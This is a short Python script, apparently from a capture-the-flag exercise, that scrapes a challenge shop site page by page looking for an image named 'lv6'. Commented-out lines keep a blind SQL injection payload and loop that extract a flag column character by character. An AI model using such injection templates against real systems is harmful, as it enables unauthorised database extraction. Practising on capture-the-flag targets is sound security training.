import requests
from lxml import etree
from time import sleep
def a():
    baseurl="http://b78518ce-dfbf-4800-a98c-91e1006303bc.node3.buuoj.cn/shop"
    flag="lv6"
    final=""
    stop=0
    for i in range(1,501):
        # print("*"*50,i,"*"*50)
        # infoid=i

        #  for j in range(32,129):
        # stop = j
        # data={"id":"1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))" %(i,j)}
        # url=baseurl+str(i)
        data={
            "page":i
        }
        re = requests.get(url=baseurl,params=data).text.replace('\n','')
        srcs = etree.HTML(re).xpath("//div[@class='grid1_of_3']//img/@src")
        # print(re)
        # print(">>",html)
        # print(html)
        # print("=============================================================")
        for src in srcs:
            if flag in src:
                # final+=chr(j)
                print("\n\t\t\t\t",i)
                # break
        # if stop >= 128:
        # print("*"*50,"结束")
        # print(">>",final)
        # break
        sleep(100/1000)

if __name__ == '__main__':
       a()